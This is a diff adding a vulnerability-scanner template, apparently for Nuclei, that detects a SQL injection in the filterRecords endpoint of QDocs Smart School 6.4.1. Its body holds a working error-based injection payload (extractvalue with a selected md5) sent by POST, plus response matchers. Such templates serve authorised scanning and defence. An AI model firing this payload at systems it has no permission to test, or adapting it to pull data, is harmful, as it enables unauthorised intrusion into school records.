@@ -1,0 +1,36 @@
+id: poc-yaml-smart-school-filterRecords-sqli
+info:
+  name: QDocs Smart School 6.4.1 filterRecords SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template detects a SQL Injection vulnerability in QDocs Smart School 6.4.1 within the filterRecords endpoint.
+variables:
+  t1: "{{rand_int(100, 10000)}}"
+  t2: "{{md5(t1)}}"
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/course/filterRecords/"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      searchdata[0][title]=&searchdata[0][searchfield]=1&searchdata[0][searchvalue]=1&searchdata[1][title]=1&searchdata[1][searchfield]=1=1 and extractvalue(1,concat(0x5e,(select md5({{t1}})),0x5e))%23&searchdata[1][searchvalue]=1
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "{{t2}}"
+        part: body
+      - type: word
+        words:
+          - "error"
+        part: body
+      - type: word
+        words:
+          - "mysqli_sql_exception"
+        part: body
